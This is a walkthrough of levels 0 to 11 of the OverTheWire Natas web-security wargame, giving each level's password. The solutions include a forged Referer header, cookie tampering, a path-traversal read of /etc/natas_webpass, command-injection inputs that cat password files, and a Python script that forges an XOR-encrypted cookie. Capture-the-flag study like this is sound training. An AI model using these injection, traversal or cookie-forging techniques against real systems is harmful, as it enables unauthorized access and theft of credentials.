# OverTheWire "Natas" Game

This is my writeup for the OverTheWrite "Natas" web challenges found [here](https://overthewire.org/wargames/natas/)

## Level 0

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

Opening the url, it says that the password to the next challenge can be found on the current page. Looking through the source code using Inspect Element, we can see an HTML comment that says this:

`The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq`

**Password**: `0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq`


## Level 1

```
Username: natas1
URL:      http://natas1.natas.labs.overthewire.org
```

The page claims that we cannot right click, but I was able to open the Inspect Element tool just fine by right-clicking on the screen. When I opened to source code, I saw this line 

`The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI`

**Password**: `TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI`


## Level 2

Looking inside the source code, we can see that there is a local image file that exists in `files/`. While this image file by itself is useless, it tells us that there is a `/files` path on the webserver that we can manually access by going to `http://natas2.natas.labs.overthewire.org/files/`

Going to this file, we can see all the files in this directory. One of the files is `users.txt`, which opening will show us this

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

**Password**: `3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH`


## Level 3

In the source code, there is a comment that tells us a hint. ` No more information leaks!! Not even Google will find it this time... `

This probably means that there is interesting information in `robots.txt`. Going there shows us this

```
User-agent: *
Disallow: /s3cr3t/
```

Going to `http://natas3.natas.labs.overthewire.org/s3cr3t/` shows us a page similar to `/files` in the previous challenge. We can see a `users.txt` file that we can open and get the password from

**Password**: `QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`


## Level 4

Going to the page, we see this displayed

```
 Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
```

My first thought was to somehow change the source URL in the request. After doing a little bit of reading on HTTP request parameters, it was clear that changing the `Referer` tag will give us what we want

In `curl`, we can use the `-e` flag to change the request `Referer`. We also need to provide the user credentials to login, so I included that in the curl request

```sh
$ curl --user natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -e "http://natas5.natas.labs.overthewire.org" http://natas4.natas.labs.overthewire.org
```

This was (the important part of) the response

```
Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```

**Password**: `0n35PkggAPm2zbEpOU802c0x0Msn1ToK`


## Level 5

Opening the webpage, we just see this: `Access disallowed. You are not logged in`

The first thing I thought of was to check the cookies, because authentication stuff is oftentimes stored in there. Entering `document.cookie` into the web console shows us that there is a cookie called `loggedin` that is currently set to 0. Changing to value to 1 logs us in and gives us the passwrod

We change  the value of the cookie like so

```
document.cookie = "loggedin=1"
```

After refreshing the page, this is what we see

```
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

**Password**: `0RoJwHdSKWFTYR5WuiAewauSuNaBXned`


## Level 6

We can view the source code, which contains this PHP code

```php
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
```

> I briefly thought the challenge had something to do with the **double equals** operator, because I remembered that it is not the ideal comparison operator to use in PHP, but it turns out that this challenge has nothing to do with that

The key is to notice the `include` line. Entering the `/includes/secret.inc` path into the URL, we can see a blank page, but if we view the page source, there is a comment with the password to the input field

Go to this URL: `http://natas6.natas.labs.overthewire.org/includes/secret.inc`. Inside the source code, we see this: `? $secret = "FOEIUWGHFEEUHOFUOIU"; ?`. 

Now we just need to enter this password on the original page (`http://natas6.natas.labs.overthewire.org/`), and it shows us the password for the level

```
Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```

**Password**: `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`


## Level 7

I somehow didn't notice it at first, but there is a comment within the source code that gives us a hint. It tells us this: `hint: password for webuser natas8 is in /etc/natas_webpass/natas8 `

Going to this URL: `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8` displays the password on the screen 

**Password**: `xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`


## Level 8

Looking into the PHP source code, we see this

```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
```

Our goal is the reverse the `encodedSecret` based on the way that the input is encoded using the `encodeSecret()` function

All we need to do is the reverse the process. This can all be done with one terminal command

```sh
$ echo 3d3d516343746d4d6d6c315669563362 | xxd -r -p | rev | base64 --decode
oubWYf2kBq
```

Entering `oubWYf2kBq` into the original page gives us the password

```
Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```

**Password**: `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`


## Level 9

We're given an input field that we can type stuff into as well as a hyperlink that shows us the source code. This is what the PHP code that they provided us looked like

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

Our goal is to get remote code execution and be able to `cat` out the `/etc/natas_webpass/natas10` file. Since the PHP code is not doing any input sanitization, we can use a semicolon (`;`) to mark the end of the grep query. Everything after the semicolon will be treated as a new command, meaning we can run whatever we want on the webserver. The string we will put into the input field will look like this: `; cat /etc/natas_webpass/natas10`

**Password**: `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`


## Level 10

Pretty much the same as the previous level, except now certain characters are blacklisted. This is the updated PHP code

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
```

One character that isn't blacklisted is the hashtag (`#`). In the terminal, the hashtag marks the start of a comment. We can use `#` to comment out the `dictionary.txt` part of the grep query. This means we can search in any file that we specify. Using the period character (`.`), we can match everything in `/etc/natas_webpass/natas11`. The string we pass into the search field would look like this: `. /etc/natas_webpass/natas11 #`

This is what the full grep command would look like on the webserver

```sh
$ grep -i . /etc/natas_webpass/natas11 # dictionary.txt
```

**Password**: `UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`


## Level 11

> Our goal in this challenge is to manipulate the value stored in a cookie that's been XOR'ed with a redacted key and then base64 encoded.

Inside the source code, we see that the default data that is being saved is this: `$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");`. We also have access to the final encoded string by looking at the web cookies by typing `document.cookie` in the web console (`data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D`).

The sequence to generate the cookie value is shown below:

`array( "showpassword"=>"no", "bgcolor"=>"#ffffff");` => `{"showpassword":"no","bgcolor":"#ffffff"}` => `XOR_FUNCTION` => `BASE64_ENCODE` => `HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D`

We know this because of the `saveData()` function in the source code

```php
function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
```

In order to get the key that was used to XOR the data, we just need to base64 decode the `HMYKBwoz...` string and then `XOR` that value with **JSON string representation** of the `$defaultdata` (this is because of the `json_encode()` function).

> This process works because `a XOR b = c` is equivalent to `a XOR c = b`

```py
# Get the key used in the xor_encrypt() function
import base64

b64_encoded = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D"
raw_data = "{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}"

b64_decoded = base64.b64decode(b64_encoded[0:len(raw_data)-1])
print(bytes(x ^ y for x,y in zip(raw_data.encode(), b64_decoded))) 
```

This script outputs: `b'eDWoeDWoeDWoeDWoeDWoeDWoeDWoeD'`. As we can see, it's just the string `eDWo` repeated a bunch of times. `eDWo` is our key

> We know the key is `eDWo` and not the entire `eDWoeDWoeDWoeDWoeDWoeDWoeDWoeD` output because this line in the source code: `$outText .= $text[$i] ^ $key[$i % strlen($key)];` tells us that the key is repeated if it's shorter than the data being encrypted.

Now that we have the key used in the `xor_encrypt()` function, we can create our own cookies. We're going to change the value of `showpassword` to `yes` so that the page will show us the password.

```py
# Generate a new cookie with the data we want
updated_data = "{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}"
key = "eDWo"
cookie_val = ''
for i in range(len(updated_data)):
    cookie_val += chr(ord(updated_data[i]) ^ ord(key[i % len(key)]))
print(base64.b64encode(cookie_val.encode()))
```

This outputs `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`, which we will set as the cookie on the webpage

`document.cookie="data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5"`

Reload the page and we get the password

`The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`

**Password**: `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`
